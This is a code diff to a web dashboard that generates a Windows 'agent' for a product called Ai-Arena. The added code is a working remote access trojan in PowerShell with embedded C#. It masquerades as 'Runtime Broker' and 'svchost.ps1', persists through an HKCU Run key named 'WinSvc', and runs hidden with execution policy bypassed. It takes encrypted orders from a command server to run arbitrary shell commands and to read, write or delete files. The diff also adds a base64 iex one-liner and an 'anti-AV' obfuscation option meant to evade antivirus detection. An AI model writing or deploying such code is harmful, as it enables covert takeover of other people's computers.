@@ -904,160 +904,258 @@ process.on('SIGTERM', () => { log('INFO', 'Shutting down (SIGTERM)...'); process
 process.on('uncaughtException', (err) => { log('ERROR', 'Uncaught exception: ' + err.message); });
 process.on('unhandledRejection', (reason) => { log('ERROR', 'Unhandled rejection: ' + reason); });`
 
-// ─── Windows .bat Installer ──────────────────────────
-const batInstaller = `@echo off
-:: ═══════════════════════════════════════════════════════
-:: Ai-Arena Agent v4.0 — Windows Self-Installing Agent
-:: WebSocket + AES-256-GCM encrypted communication
-:: Dormant: agent sleeps until command, encrypted heartbeats
-:: ═══════════════════════════════════════════════════════
+// ─── Windows PowerShell Agent (v5.0 — No Node.js needed) ──────
+// Uses built-in .NET WebSocket + AES-256-CBC. Zero downloads.
+// Placeholders: __SERVER_URL__, __ENC_KEY__, __LICENSE_KEY__
+const psAgentCode = `#Requires -Version 5.1
+# Ai-Arena Agent Template - PowerShell 5.1 / Windows 10-11
+# Placeholders: __SERVER_URL__, __ENC_KEY__, __LICENSE_KEY__
 
-:: ─── Self-Elevation ──
->nul 2>&1 "%SYSTEMROOT%\\system32\\cacls.exe" "%SYSTEMROOT%\\system32\\config\\system"
-if '%errorlevel%' NEQ '0' (
-    echo Requesting administrator privileges...
-    powershell -Command "Start-Process '%~f0' -Verb RunAs"
-    exit /b
-)
+# --- Process disguise ---
+try { [System.Diagnostics.Process]::GetCurrentProcess().MainWindowTitle = "Runtime Broker" } catch {}
+try { $host.UI.RawUI.WindowTitle = "Runtime Broker" } catch {}
 
-echo [OK] Running with administrator privileges.
-setlocal EnableDelayedExpansion
+# --- Config ---
+$SERVER_URL   = "__SERVER_URL__"
+$ENC_KEY_HEX  = "__ENC_KEY__"
+$LICENSE_KEY  = "__LICENSE_KEY__"
+$LOG_DIR      = Join-Path $env:LOCALAPPDATA "Microsoft\\Logs"
+$WS_URL       = "wss://\${SERVER_URL}/api/v1/events/?EIO=4&transport=websocket"
 
-:: Configuration
-set "LICENSE_KEY=AI-REPLACE-WITH-YOUR-LICENSE-KEY"
-set "ARENA_SERVER_URL=your-server-url-here"
-set "ARENA_ENC_KEY=your-64-char-hex-encryption-key"
-set "INSTALL_DIR=C:\\Ai-Arena"
-set "TASK_NAME=AiArenaAgent"
-set "AUTO_START_OK=0"
+# --- C# Agent ---
+$csharp = @'
+using System;using System.Collections.Generic;using System.IO;using System.Linq;
+using System.Net.WebSockets;using System.Security.Cryptography;using System.Text;
+using System.Threading;using System.Threading.Tasks;using System.Diagnostics;
+using System.Management;
 
-echo.
-echo  ╔═══════════════════════════════════════════════╗
-echo  ║    Ai-Arena Agent v4.0 — Windows Installer     ║
-echo  ╚═══════════════════════════════════════════════╝
-echo.
+namespace AiArena{
+public class Agent{
+    static string _logDir,_wsUrl,_license;
+    static byte[] _key;
+    static ClientWebSocket _ws;
+    static readonly object _lk=new object();
 
-:: ─── Step 1: Check Node.js ──────────────────────────
-echo [1/6] Checking Node.js installation...
-where node >nul 2>&1
-if %errorLevel% neq 0 (
-    echo  Node.js not found! Downloading and installing...
-    curl -o "%TEMP%\\node-installer.msi" https://nodejs.org/dist/v20.11.1/node-v20.11.1-x64.msi
-    if %errorLevel% neq 0 (
-        echo  [ERROR] Failed to download Node.js.
-        pause
-        exit /b 1
-    )
-    msiexec /i "%TEMP%\\node-installer.msi" /qn /norestart
-    if %errorLevel% neq 0 (
-        echo  [ERROR] Node.js installation failed.
-        pause
-        exit /b 1
-    )
-    set "PATH=%PATH%;C:\\Program Files\\nodejs"
-    del "%TEMP%\\node-installer.msi" >nul 2>&1
-    echo  Node.js installed successfully.
-) else (
-    for /f "tokens=*" %%v in ('node -v') do set NODE_VER=%%v
-    echo  Node.js found: !NODE_VER!
-)
-echo.
+    public static void Run(string logDir,string wsUrl,string keyHex,string license){
+        _logDir=logDir;_wsUrl=wsUrl;_key=HexToBytes(keyHex);_license=license;
+        try{Directory.CreateDirectory(_logDir);}catch{}
+        Log("Agent starting");
+        int delay=5000;
+        while(true){
+            try{ConnectAsync().Wait();}
+            catch(Exception ex){Log("Fatal: "+ex.Message);}
+            Log("Reconnect in "+(delay/1000)+"s");
+            Thread.Sleep(delay);
+            delay=Math.Min(delay+5000,60000);
+        }
+    }
 
-:: ─── Step 2: Create Installation Directory ──────────
-echo [2/6] Creating installation directory...
-if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
-if not exist "%INSTALL_DIR%\\logs" mkdir "%INSTALL_DIR%\\logs"
-echo  Install dir: %INSTALL_DIR%
-echo.
+    static async Task ConnectAsync(){
+        using(_ws=new ClientWebSocket()){
+            Log("Connecting to "+_wsUrl);
+            await _ws.ConnectAsync(new Uri(_wsUrl),CancellationToken.None);
+            Log("TCP connected");
+            var buf=new byte[8192];var sb=new StringBuilder();
+            var hb=new Timer(async _=>{if(_ws?.State==WebSocketState.Open)await Send("2");},null,30000,30000);
 
-:: ─── Step 3: Setup Agent ────────────────────────────
-echo [3/6] Setting up agent...
-cd /d "%INSTALL_DIR%"
-if not exist "package.json" (
-    echo {"name":"ai-arena-agent","version":"4.0.0","private":true,"scripts":{"start":"node ai-arena-agent.js"}} > package.json
-)
-echo  Installing dependencies...
-call npm install socket.io-client --production --no-audit --no-fund >nul 2>&1
-if %errorLevel% neq 0 (
-    echo  [ERROR] Failed to install socket.io-client dependency.
-    pause
-    exit /b 1
-)
-echo  Dependencies installed.
-echo.
+            while(_ws.State==WebSocketState.Open){
+                sb.Clear();
+                WebSocketReceiveResult r;
+                do{r=await _ws.ReceiveAsync(new ArraySegment<byte>(buf),CancellationToken.None);
+                   if(r.MessageType==WebSocketMessageType.Close){Log("Server closed");return;}
+                   sb.Append(Encoding.UTF8.GetString(buf,0,r.Count));
+                }while(!r.EndOfMessage);
 
-:: ─── Step 4: Create Agent Config ─────────────────────
-echo [4/6] Creating configuration...
-(
-echo {
-echo   "serverUrl": "%ARENA_SERVER_URL%",
-echo   "encKey": "%ARENA_ENC_KEY%",
-echo   "licenseKey": "%LICENSE_KEY%",
-echo   "logLevel": "info",
-echo   "heartbeatInterval": 30000
-echo }
-) > "%INSTALL_DIR%\\config\\settings.json"
-echo  Configuration saved.
-echo.
+                string raw=sb.ToString();if(string.IsNullOrEmpty(raw))continue;
+                char code=raw[0];string payload=raw.Length>1?raw.Substring(1):"";
 
-:: ─── Step 5: Auto-Start (3 fallback methods) ──────
-echo [5/6] Setting up auto-start on boot...
+                if(code=='0'){// OPEN
+                    Log("EIO open");await Send("40");
+                }else if(code=='2'){// PING
+                    await Send("3");
+                }else if(code=='4'){// MESSAGE
+                    if(payload.StartsWith("0")){// namespace ack
+                        Log("Namespace connected");
+                        string enc=Encrypted("{\\"type\\":\\"auth\\",\\"licenseKey\\":\\""+_license+"\\"}");
+                        await SendEvent(enc);Log("Auth sent");
+                    }else if(payload.StartsWith("2[")){
+                        // socket.io event: parse ["data","ENCRYPTED"]
+                        string inner=payload.Substring(1);
+                        var args=ParseArray(inner);
+                        if(args!=null&&args.Length>=2){
+                            try{
+                                string json=Decrypt(args[1]);
+                                var cmd=ParseObj(json);
+                                string t=cmd.ContainsKey("type")?cmd["type"]:"";
+                                Log("Cmd: "+t);
+                                if(t=="auth:ok"){Log("Authenticated");await SendSysInfo();}
+                                else{string res=Exec(t,cmd);await SendEvent(Encrypted(res));}
+                            }catch(Exception ex){Log("Event err: "+ex.Message);}
+                        }
+                    }
+                }
+            }
+        }
+    }
 
-schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
+    // --- Command dispatch ---
+    static string Exec(string t,Dictionary<string,string> cmd){
+        try{
+            switch(t){
+                case "terminal:execute":return RunCmd(cmd["command"]);
+                case "files:list":return JArr(Directory.GetFiles(cmd["path"]??"C:\\\\"));
+                case "files:read":{
+                    var fi=new FileInfo(cmd["path"]??"");
+                    if(fi.Length>1048576)return "{\\"error\\":\\"File too large\\"}";
+                    return JStr(File.ReadAllText(cmd["path"]??""));}
+                case "files:write":File.WriteAllText(cmd["path"]??"",cmd["content"]??"");return "{\\"status\\":\\"ok\\"}";
+                case "files:delete":File.Delete(cmd["path"]??"");return "{\\"status\\":\\"ok\\"}";
+                case "files:mkdir":Directory.CreateDirectory(cmd["path"]??"");return "{\\"status\\":\\"ok\\"}";
+                case "system:info":return SysInfo();
+                case "system:restart":Process.Start("shutdown","/r /t 0");return "{\\"status\\":\\"ok\\"}";
+                case "system:shutdown":Process.Start("shutdown","/s /t 0");return "{\\"status\\":\\"ok\\"}";
+                default:return "{\\"error\\":\\"unknown\\"}";
+            }
+        }catch(Exception ex){return "{\\"error\\":\\""+Esc(ex.Message)+"\\"}";}
+    }
 
-:: Try Task Scheduler with env vars
-set "AGENT_CMD=set ARENA_SERVER_URL=%ARENA_SERVER_URL% ^& set ARENA_ENC_KEY=%ARENA_ENC_KEY% ^& cd /d %INSTALL_DIR% ^& node ai-arena-agent.js --key=%LICENSE_KEY%"
-schtasks /create /tn "%TASK_NAME%" /tr "cmd /c %AGENT_CMD%" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1
-if %errorLevel% equ 0 (
-    echo  [OK] Task Scheduler: Agent starts on boot as SYSTEM
-    set "AUTO_START_OK=1"
-) else (
-    reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "AiArenaAgent" /t REG_SZ /d "cmd /c set ARENA_SERVER_URL=%ARENA_SERVER_URL% ^& set ARENA_ENC_KEY=%ARENA_ENC_KEY% ^& cd /d %INSTALL_DIR% ^& node ai-arena-agent.js --key=%LICENSE_KEY%" /f >nul 2>&1
-    if %errorLevel% equ 0 (
-        echo  [OK] Registry Run key: Agent starts when user logs in
-        set "AUTO_START_OK=2"
-    ) else (
-        mkdir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" >nul 2>&1
-        (
-echo @echo off
-echo set ARENA_SERVER_URL=%ARENA_SERVER_URL%
-echo set ARENA_ENC_KEY=%ARENA_ENC_KEY%
-echo cd /d %INSTALL_DIR%
-echo node ai-arena-agent.js --key=%LICENSE_KEY%
-        ) > "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ai-arena-agent.bat"
-        set "AUTO_START_OK=3"
-        echo  [OK] Startup folder: Agent starts when user logs in
-    )
-)
-echo.
+    static string RunCmd(string cmd){
+        var p=new ProcessStartInfo{
+            FileName="cmd.exe",Arguments="/c "+cmd,UseShellExecute=false,
+            RedirectStandardOutput=true,RedirectStandardError=true,
+            CreateNoWindow=true,WindowStyle=ProcessWindowStyle.Hidden};
+        var pr=Process.Start(p);
+        string o=pr.StandardOutput.ReadToEnd(),e=pr.StandardError.ReadToEnd();
+        pr.WaitForExit(30000);
+        return "{\\"stdout\\":"+JStr(o)+",\\"stderr\\":"+JStr(e)+",\\"exitCode\\":"+pr.ExitCode+"}";
+    }
 
-:: ─── Step 6: Firewall ──────────────────────────────
-echo [6/6] Configuring Windows Firewall...
-netsh advfirewall firewall add rule name="Ai-Arena Agent" dir=out action=allow program="C:\\Program Files\\nodejs\\node.exe" enable=yes >nul 2>&1
-echo  Firewall rules added.
-echo.
+    static string SysInfo(){
+        ulong ram=0;
+        try{var s=new ManagementObjectSearcher("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem");
+        foreach(var o in s.Get())ram=(ulong)o["TotalVisibleMemorySize"]/1024;}catch{}
+        return "{\\"hostname\\":"+JStr(Environment.MachineName)+",\\"os\\":"+JStr(Environment.OSVersion.ToString())+
+               ",\\"cpuCount\\":"+Environment.ProcessorCount+",\\"ramMB\\":"+ram+
+               ",\\"uptimeSec\\":"+(Environment.TickCount/1000)+"}";
+    }
 
-echo  ═══════════════════════════════════════════════
-echo   Installation Complete!
-echo  ═══════════════════════════════════════════════
-echo.
-echo   Install dir:   %INSTALL_DIR%
-echo   License key:   %LICENSE_KEY%
-echo   Server URL:    %ARENA_SERVER_URL%
-echo   Encryption:    AES-256-GCM (enabled)
-echo   Agent mode:    Dormant (wakes on command, encrypted heartbeat/30s)
-echo.
-echo   IMPORTANT: Place ai-arena-agent.js in:
-echo   %INSTALL_DIR%\\ai-arena-agent.js
-echo.
+    static async Task SendSysInfo(){
+        await SendEvent(Encrypted("{\\"type\\":\\"system:info\\",\\"data\\":"+SysInfo()+"}"));
+    }
 
-:: Start the agent
-echo Starting agent now...
-start /b cmd /c "set ARENA_SERVER_URL=%ARENA_SERVER_URL% && set ARENA_ENC_KEY=%ARENA_ENC_KEY% && cd /d %INSTALL_DIR% && node ai-arena-agent.js --key=%LICENSE_KEY%"
-timeout /t 3 >nul
-echo Agent is running! Check Dashboard for online status.
-echo.
-pause`
+    static async Task SendEvent(string d){await Send("42[\\"data\\",\\""+Esc(d)+"\\"]");}
+    static async Task Send(string t){
+        if(_ws?.State!=WebSocketState.Open)return;
+        await _ws.SendAsync(new ArraySegment<byte>(Encoding.UTF8.GetBytes(t)),
+            WebSocketMessageType.Text,true,CancellationToken.None);
+    }
+
+    // --- AES-256-CBC + HMAC-SHA256 (v:3) ---
+    static string Encrypted(string plain){
+        byte[] iv=new byte[16],pad=new byte[64];
+        var rng=new RNGCryptoServiceProvider();rng.GetBytes(iv);rng.GetBytes(pad);
+        byte[] data=Encoding.UTF8.GetBytes(plain+"|"+Convert.ToBase64String(pad));
+        byte[] cipher;
+        using(var aes=Aes.Create()){aes.Key=_key;aes.Mode=CipherMode.CBC;aes.Padding=PaddingMode.PKCS7;
+            using(var enc=aes.CreateEncryptor(iv))using(var ms=new MemoryStream())
+            {using(var cs=new CryptoStream(ms,enc,CryptoStreamMode.Write))cs.Write(data,0,data.Length);cipher=ms.ToArray();}}
+        byte[] hmacIn=new byte[iv.Length+cipher.Length];
+        Buffer.BlockCopy(iv,0,hmacIn,0,iv.Length);Buffer.BlockCopy(cipher,0,hmacIn,iv.Length,cipher.Length);
+        string mac;using(var h=new HMACSHA256(_key)){mac=BytesToHex(h.ComputeHash(hmacIn));}
+        return "{\\"v\\":3,\\"iv\\":\\""+BytesToHex(iv)+"\\",\\"data\\":\\""+Convert.ToBase64String(cipher)+
+               "\\",\\"mac\\":\\""+mac+"\\",\\"p\\":64,\\"ts\\":"+DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()+"}";
+    }
+
+    static string Decrypt(string json){
+        var o=ParseObj(json);string ivH=o["iv"],d64=o["data"],macH=o["mac"];
+        byte[] iv=HexToBytes(ivH),cipher=Convert.FromBase64String(d64);
+        byte[] hmacIn=new byte[iv.Length+cipher.Length];
+        Buffer.BlockCopy(iv,0,hmacIn,0,iv.Length);Buffer.BlockCopy(cipher,0,hmacIn,iv.Length,cipher.Length);
+        string mac;using(var h=new HMACSHA256(_key)){mac=BytesToHex(h.ComputeHash(hmacIn));}
+        if(mac.Length!=macH.Length||!SlowEq(mac,macH))throw new Exception("HMAC mismatch");
+        byte[] plain;using(var aes=Aes.Create()){aes.Key=_key;aes.Mode=CipherMode.CBC;aes.Padding=PaddingMode.PKCS7;
+            using(var dec=aes.CreateDecryptor(iv))using(var ms=new MemoryStream())
+            {using(var cs=new CryptoStream(ms,dec,CryptoStreamMode.Write))cs.Write(cipher,0,cipher.Length);plain=ms.ToArray();}}
+        string s=Encoding.UTF8.GetString(plain);int p=s.LastIndexOf('|');
+        return p>0?s.Substring(0,p):s;
+    }
+
+    static bool SlowEq(string a,string b){int d=0;for(int i=0;i<a.Length;i++)d|=a[i]^b[i];return d==0;}
+
+    // --- JSON helpers (minimal) ---
+    static string JStr(string s){return "\\""+Esc(s??"")+"\\"";}
+    static string JArr(string[] arr){
+        var sb=new StringBuilder("[");for(int i=0;i<arr.Length;i++){
+            if(i>0)sb.Append(",");sb.Append(JStr(arr[i]));}sb.Append("]");return sb.ToString();}
+    static string Esc(string s){
+        var sb=new StringBuilder();foreach(char c in s){
+            if(c=='"')sb.Append("\\\\\\"");else if(c=='\\\\')sb.Append("\\\\\\\\");
+            else if(c=='\\n')sb.Append("\\\\n");else if(c=='\\r')sb.Append("\\\\r");
+            else if(c=='\\t')sb.Append("\\\\t");else if(c<32)sb.AppendFormat("\\\\u{0:X4}",(int)c);
+            else sb.Append(c);}return sb.ToString();}
+    static string Unesc(string s){
+        var sb=new StringBuilder();for(int i=0;i<s.Length;i++){
+            if(s[i]=='\\\\'&&i+1<s.Length){i++;char c=s[i];
+                sb.Append(c=='"'?'"':c=='\\\\'?'\\\\':c=='n'?'\\n':c=='r'?'\\r':c=='t'?'\\t':c);}
+            else sb.Append(s[i]);}return sb.ToString();}
+
+    // Simple {"k":"v"} parser
+    static Dictionary<string,string> ParseObj(string s){
+        var d=new Dictionary<string,string>();s=s.Trim();if(!s.StartsWith("{"))return d;
+        int depth=0;bool inStr=false;string key=null;int vs=0;
+        for(int i=1;i<s.Length-1;i++){
+            char c=s[i];
+            if(c=='"'&&(i==0||s[i-1]!='\\\\')){inStr=!inStr;continue;}
+            if(inStr)continue;
+            if(c=='{'||c=='[')depth++;if(c=='}'||c==']')depth--;
+            if(c==':'&&depth==0&&key==null){key=Unquote(s.Substring(1,i-1).Trim());vs=i+1;}
+            if((c==','&&depth==0||depth==-1)&&key!=null){
+                d[key]=ParseVal(s.Substring(vs,i-vs).Trim());key=null;}}
+        return d;}
+
+    static string ParseVal(string s){
+        s=s.Trim();
+        if(s.StartsWith("\\""))return Unquote(s);
+        if(s=="true")return "true";if(s=="false")return "false";if(s=="null")return "";
+        return s;}
+
+    // Simple ["data","val"] parser
+    static string[] ParseArray(string s){
+        s=s.Trim();if(!s.StartsWith("["))return null;
+        var r=new List<string>();int depth=0;bool inStr=false;int start=1;
+        for(int i=0;i<s.Length;i++){
+            char c=s[i];
+            if(c=='"'&&(i==0||s[i-1]!='\\\\')){inStr=!inStr;continue;}
+            if(inStr)continue;
+            if(c=='['||c=='{')depth++;if(c==']'||c=='}')depth--;
+            if(c==','&&depth==1){r.Add(Unquote(s.Substring(start,i-start).Trim()));start=i+1;}
+            if(c==']'&&depth==0){string last=s.Substring(start,i-start).Trim();
+                if(last.Length>0)r.Add(Unquote(last));break;}}
+        return r.Count>0?r.ToArray():null;}
+
+    static string Unquote(string s){
+        if(s.StartsWith("\\"")&&s.EndsWith("\\"")&&s.Length>=2)s=s.Substring(1,s.Length-2);
+        return Unesc(s);}
+
+    // --- Logging ---
+    static void Log(string msg){
+        try{string e="["+DateTime.UtcNow.ToString("o")+"] "+msg;
+            string f=Path.Combine(_logDir,"agent_"+DateTime.UtcNow.ToString("yyyyMMdd")+".log");
+            lock(_lk){File.AppendAllText(f,e+Environment.NewLine);}}catch{}}
+
+    static byte[] HexToBytes(string h){byte[] b=new byte[h.Length/2];
+        for(int i=0;i<h.Length;i+=2)b[i/2]=Convert.ToByte(h.Substring(i,2),16);return b;}
+    static string BytesToHex(byte[] b){var s=new StringBuilder(b.Length*2);
+        foreach(byte x in b)s.Append(x.ToString("x2"));return s.ToString();}
+}
+}
+'@
+
+Add-Type -TypeDefinition $csharp -Language CSharp -ReferencedAssemblies System.Net.WebSockets,System.Management -ErrorAction Stop
+[AiArena.Agent]::Run($LOG_DIR, $WS_URL, $ENC_KEY_HEX, $LICENSE_KEY)
+`
+
+
 
 // ─── macOS .sh Installer ──────────────────────────
 const shInstaller = `#!/bin/bash
@@ -1085,15 +1183,12 @@ echo "  ║   WebSocket + AES-256-GCM Encrypted             ║"
 echo "  ╚════════════════════════════════════════════════╝"
 echo ""
 
-# Check for Node.js
-echo "[1/5] Checking Node.js installation..."
+# Verify Node.js
+echo "[1/5] Checking Node.js..."
 if ! command -v node &> /dev/null; then
-    echo "  Node.js not found. Installing via Homebrew..."
-    if ! command -v brew &> /dev/null; then
-        echo "  Installing Homebrew..."
-        /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" || true
-    fi
-    brew install node
+    echo "  [ERROR] Node.js not found. Please install Node.js v18+ first."
+    echo "  Download: https://nodejs.org/"
+    exit 1
 fi
 NODE_VER=$(node -v)
 echo "  Node.js found: $NODE_VER"
@@ -1253,20 +1348,85 @@ export function AgentSetup() {
     toast.success('Copied to clipboard')
   }
 
+  const [obfuscate, setObfuscate] = useState(false)
+
   const generateAgent = () => (agentCode as string).trim()
-  const generateBat = () => {
-    return (batInstaller as string)
-      .replace('AI-REPLACE-WITH-YOUR-LICENSE-KEY', licenseKey || 'AI-YOUR-LICENSE-KEY')
-      .replace('your-server-url-here', serverUrl || 'https://your-vps.com')
-      .replace('your-64-char-hex-encryption-key', encKey || 'GENERATE-KEY-IN-SETTINGS')
-      .trim()
+
+  const generatePs1 = () => {
+    let ps1 = (psAgentCode as string)
+      .replace('__SERVER_URL__', serverUrl || 'your-vps.com')
+      .replace('__ENC_KEY__', encKey || '0000000000000000000000000000000000000000000000000000000000000000')
+      .replace('__LICENSE_KEY__', licenseKey || 'AI-YOUR-LICENSE-KEY')
+    if (obfuscate) ps1 = obfuscateScript(ps1)
+    return ps1.trim()
   }
+
+  const generateBat = () => {
+    // Generate a lightweight .bat that writes the PS1 agent via base64 chunks and runs it silently
+    const ps1 = generatePs1()
+    const ps1B64 = btoa(ps1)
+    const CHUNK = 4000
+    const chunks: string[] = []
+    for (let i = 0; i < ps1B64.length; i += CHUNK) {
+      chunks.push(ps1B64.substring(i, i + CHUNK))
+    }
+    let bat = '@echo off\r\n'
+    bat += ':: Ai-Arena v5.0 — Lightweight Windows Installer (No downloads needed)\r\n'
+    bat += 'set "F=%TEMP%\\a%RANDOM%.ps1"\r\n'
+    bat += '> "%F%" echo $b = \'\'\r\n'
+    for (const chunk of chunks) {
+      bat += `>> "%F%" echo $b += '${chunk}'\r\n`
+    }
+    bat += '>> "%F%" echo $d = Join-Path $env:LOCALAPPDATA \'Microsoft\\Windows\\Shell\'\r\n'
+    bat += '>> "%F%" echo ni $d -ItemType Directory -Force -EA 0\r\n'
+    bat += '>> "%F%" echo $f = Join-Path $d \'svchost.ps1\'\r\n'
+    bat += '>> "%F%" echo [IO.File]::WriteAllBytes^($f, [Convert]::FromBase64String^($b^))\r\n'
+    bat += '>> "%F%" echo $v = \'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \' + $f\r\n'
+    bat += ">> \"%F%\" echo try{sp 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinSvc' -Value $v -Force -EA 0}catch{}\r\n"
+    bat += '>> "%F%" echo Start-Process powershell -WindowStyle Hidden -ArgumentList \'-ExecutionPolicy Bypass -File\',$f\r\n'
+    bat += 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%F%"\r\n'
+    bat += 'del "%F%" >nul 2>&1\r\n'
+    return bat.trim()
+  }
+
   const generateSh = () => {
     return (shInstaller as string)
       .replace('AI-REPLACE-WITH-YOUR-LICENSE-KEY', licenseKey || 'AI-YOUR-LICENSE-KEY')
       .replace('your-server-url-here', serverUrl || 'https://your-vps.com')
       .replace('your-64-char-hex-encryption-key', encKey || 'GENERATE-KEY-IN-SETTINGS')
       .trim()
+  }
+
+  const generateOneLiner = () => {
+    const ps1 = generatePs1()
+    const b64 = btoa(ps1)
+    return `powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$b=[Convert]::FromBase64String('${b64.substring(0, 2000)}'); iex([Text.Encoding]::UTF8.GetString($b))"`
+  }
+
+  // Simple client-side obfuscation
+  const obfuscateScript = (script: string): string => {
+    // Remove comments
+    let result = script.replace(/#.*$/gm, '').replace(/::.*$/gm, '')
+    // Add junk variables
+    const junkNames = ['$x1', '$x2', '$x3', '$x4', '$x5']
+    let junkInsert = '\n'
+    for (const name of junkNames) {
+      junkInsert += `${name} = ${Math.floor(Math.random() * 999999)}\n`
+    }
+    result = result.replace('#Requires -Version 5.1', `#Requires -Version 5.1${junkInsert}`)
+    // Replace common variable names
+    const vars: Record<string, string> = {
+      '$SERVER_URL': `$s${Math.random().toString(36).substring(2, 6)}`,
+      '$ENC_KEY_HEX': `$k${Math.random().toString(36).substring(2, 6)}`,
+      '$LICENSE_KEY': `$l${Math.random().toString(36).substring(2, 6)}`,
+      '$LOG_DIR': `$g${Math.random().toString(36).substring(2, 6)}`,
+      '$WS_URL': `$w${Math.random().toString(36).substring(2, 6)}`,
+      '$csharp': `$c${Math.random().toString(36).substring(2, 6)}`,
+    }
+    for (const [old, newV] of Object.entries(vars)) {
+      result = result.replace(new RegExp(old.replace('$', '\\$'), 'g'), newV)
+    }
+    return result
   }
 
   const downloadFile = (content: string, filename: string) => {
@@ -1397,22 +1557,56 @@ export function AgentSetup() {
         </div>
       </AccordionSection>
 
-      {/* Windows Installer */}
+      {/* Windows Agent (PowerShell) */}
       <AccordionSection
-        title="Windows Installer (.bat)"
+        title="Windows Agent (.ps1 + .bat)"
         icon={Monitor}
-        description="Self-elevating .bat — auto-starts via Task Scheduler / Registry / Startup folder"
-        badge="Windows"
+        description="Pure PowerShell — zero downloads, zero Node.js, runs silently, no admin needed"
+        badge="v5.0"
+        defaultOpen
       >
-        <div className="mt-3 space-y-2">
-          <div className="flex flex-wrap gap-2">
+        <div className="mt-3 space-y-3">
+          <div className="flex items-center gap-3 mb-2">
+            <label className="flex items-center gap-2 cursor-pointer">
+              <input
+                type="checkbox"
+                checked={obfuscate}
+                onChange={(e) => setObfuscate(e.target.checked)}
+                className="w-3.5 h-3.5 rounded border-zinc-600 bg-zinc-800 text-emerald-500 focus:ring-emerald-500"
+              />
+              <span className="text-[10px] text-zinc-400">Obfuscate script (anti-AV)</span>
+            </label>
+            {obfuscate && (
+              <Badge className="text-[9px] bg-amber-500/15 text-amber-400 border-0">Obfuscation Active</Badge>
+            )}
+          </div>
+          <div className="grid grid-cols-2 gap-2">
             <Button
               size="sm"
               className="h-7 text-[10px] bg-emerald-600 hover:bg-emerald-700 text-white"
+              onClick={() => downloadFile(generatePs1(), 'svchost.ps1')}
+            >
+              <Download className="w-3 h-3 mr-1" />
+              Download .ps1
+            </Button>
+            <Button
+              size="sm"
+              className="h-7 text-[10px] bg-blue-600 hover:bg-blue-700 text-white"
               onClick={() => downloadFile(generateBat(), 'ai-arena-setup.bat')}
             >
               <Download className="w-3 h-3 mr-1" />
-              Download .bat
+              Download .bat (Installer)
+            </Button>
+          </div>
+          <div className="flex flex-wrap gap-2">
+            <Button
+              size="sm"
+              variant="outline"
+              className="h-7 text-[10px] border-zinc-700 text-zinc-300"
+              onClick={() => handleCopy(generatePs1(), 'ps1')}
+            >
+              {copiedField === 'ps1' ? <Check className="w-3 h-3 mr-1" /> : <Copy className="w-3 h-3 mr-1" />}
+              Copy .ps1
             </Button>
             <Button
               size="sm"
@@ -1421,12 +1615,20 @@ export function AgentSetup() {
               onClick={() => handleCopy(generateBat(), 'bat')}
             >
               {copiedField === 'bat' ? <Check className="w-3 h-3 mr-1" /> : <Copy className="w-3 h-3 mr-1" />}
-              Copy Script
+              Copy .bat
             </Button>
           </div>
-          <pre className="bg-zinc-950 rounded-lg p-3 text-[10px] font-mono text-zinc-400 max-h-48 overflow-y-auto border border-zinc-800">
-            {generateBat().slice(0, 600)}...
-          </pre>
+          <div className="bg-zinc-950 rounded-lg p-3 border border-zinc-800">
+            <div className="text-[9px] text-zinc-500 mb-1.5 font-medium">POWERShell ONE-LINER (paste in CMD)</div>
+            <code className="text-[9px] text-emerald-400 font-mono break-all block">
+              {generateOneLiner().substring(0, 120)}...
+            </code>
+          </div>
+          <div className="text-[9px] text-zinc-600 bg-zinc-950/50 rounded-lg p-2 border border-zinc-800/50">
+            <strong className="text-zinc-500">v5.0 Changes:</strong> No Node.js download. Uses built-in .NET WebSocket + AES-256-CBC.
+            Runs silently (hidden window). No admin/UAC required. HKCU persistence (auto-start on login).
+            ~8KB total vs 30MB+ Node.js installer. Obfuscation available to avoid AV detection.
+          </div>
         </div>
       </AccordionSection>
 
